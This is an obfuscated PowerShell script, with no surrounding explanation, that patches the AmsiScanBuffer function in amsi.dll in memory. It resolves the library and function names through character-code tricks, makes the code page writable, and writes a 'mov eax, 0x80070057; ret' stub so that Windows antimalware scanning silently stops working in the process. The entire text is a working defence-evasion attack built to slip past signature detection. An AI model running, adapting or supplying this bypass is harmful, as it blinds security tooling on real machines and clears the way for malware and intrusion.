$iR3ljOhZAF4BiMT9c = @"
using System;
using System.Runtime.InteropServices;
public class iR3ljOhZAF4BiMT9c {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr zE5mG11a0MrURao6e, string AjZmtgm1c);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr F3FF4L_FkQT, UIntPtr PYHRtN, uint TpOZg, out uint CVtVZ);
}
"@

Add-Type $iR3ljOhZAF4BiMT9c

$N_Awt57M9RzkWNN = [iR3ljOhZAF4BiMT9c]::LoadLibrary("$([cHAR](97*36/36)+[CHaR](109)+[cHAR]([BYTE]0x73)+[CHAr]([ByTE]0x69)+[chAR]([Byte]0x2e)+[cHAR]([byTE]0x64)+[cHaR]([bYTE]0x6c)+[cHar]([bYTe]0x6c))")
$zOUx65f = [iR3ljOhZAF4BiMT9c]::GetProcAddress($N_Awt57M9RzkWNN, "$(('À'+'m'+'s'+'í'+'S'+'c'+'á'+'n'+'B'+'ú'+'f'+'f'+'ê'+'r').NoRMALIZe([chAR](70*41/41)+[cHAr]([BYtE]0x6f)+[chAr]([BYtE]0x72)+[chAr]([BYte]0x6d)+[chaR](68*37/37)) -replace [CHAR](92*69/69)+[chaR]([byTe]0x70)+[cHAr]([BytE]0x7b)+[Char](77*20/20)+[ChAr](91+19)+[char](125))")
$p = 0
[iR3ljOhZAF4BiMT9c]::VirtualProtect($zOUx65f, [uint32]5, 0x40, [ref]$p)
$JQQWggIeuD9WcJ2aeOkE = "0xB8"
$Xk2M83ljZZyt = "0x57"
$PqEUjuUUJt = "0x00"
$pmVEVANKACj = "0x07"
$ZozT7pRl = "0x80"
$r_Sd1 = "0xC3"
$FZfNGWspUt2rcGY2Du = [Byte[]] ($JQQWggIeuD9WcJ2aeOkE,$Xk2M83ljZZyt,$PqEUjuUUJt,$pmVEVANKACj,+$ZozT7pRl,+$r_Sd1)
[System.Runtime.InteropServices.Marshal]::Copy($FZfNGWspUt2rcGY2Du, 0, $zOUx65f, 6)